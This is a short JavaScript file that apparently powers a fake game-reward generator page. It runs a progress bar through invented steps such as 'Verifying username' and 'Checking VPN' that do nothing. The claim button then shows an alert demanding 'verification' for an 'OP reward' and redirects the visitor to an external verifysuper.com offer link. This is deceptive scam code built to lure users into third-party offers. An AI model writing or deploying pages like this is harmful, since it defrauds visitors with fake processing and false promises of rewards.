
const progressBar = document.getElementById("progressBar");
const progressText = document.getElementById("progressText");
const rewardSection = document.getElementById("rewardSection");
const claimBtn = document.getElementById("claimBtn");

let progress = 0;
const steps = ["Generating reward...", "Verifying username...", "Checking VPN...", "Finalizing..."];

function simulateProgress() {
  const interval = setInterval(() => {
    if (progress >= 100) {
      clearInterval(interval);
      rewardSection.style.display = "block";
    } else {
      progress += 1;
      progressBar.style.width = progress + "%";
      progressText.textContent = steps[Math.floor(progress / 25)] + " " + progress + "%";
    }
  }, 100);
}

simulateProgress();

claimBtn.addEventListener("click", () => {
  alert("Please complete the verification to receive your OP reward!");
  window.location.href = "https://verifysuper.com/cl/i/x6e5m9";
});
